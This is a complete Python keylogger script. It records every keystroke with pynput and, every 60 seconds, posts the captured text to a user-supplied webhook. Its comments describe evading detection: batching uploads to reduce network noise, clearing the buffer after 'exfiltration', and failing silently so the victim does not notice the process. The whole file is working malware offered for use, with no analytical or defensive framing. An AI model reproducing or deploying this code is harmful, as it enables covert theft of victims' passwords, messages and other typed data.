import pynput.keyboard
import requests
import threading

# CONFIGURATION
WEBHOOK_URL = "Enter Your own webhook url" 
SEND_INTERVAL = 60 # WHY: Send data every 60 seconds to reduce network noise/detection.

class RemoteLogger:
    def __init__(self):
        self.log = "" # WHY: Buffer keys locally so we don't send 1 request per keystroke.

    def append_keys(self, key):
        try:
            self.log += key.char
        except AttributeError:
            if key == pynput.keyboard.Key.space:
                self.log += " "
            else:
                self.log += f" [{key}] "

    def report(self):
        # WHY: Check if there is actually data to send before hitting the network.
        if self.log:
            try:
                # Sending as a JSON payload to the webhook
                requests.post(WEBHOOK_URL, json={"content": f"Captured: {self.log}"})
                self.log = "" # Clear buffer after successful exfiltration.
            except Exception:
                pass # WHY: Fail silently. A crash reveals the process to the user.
        
        # Recursive timer to keep the reporting loop alive.
        timer = threading.Timer(SEND_INTERVAL, self.report)
        timer.start()

# Initialize and start the reporting thread.
logger = RemoteLogger()
logger.report()

# Start the keyboard listener.
with pynput.keyboard.Listener(on_press=logger.append_keys) as listener:
    listener.join()
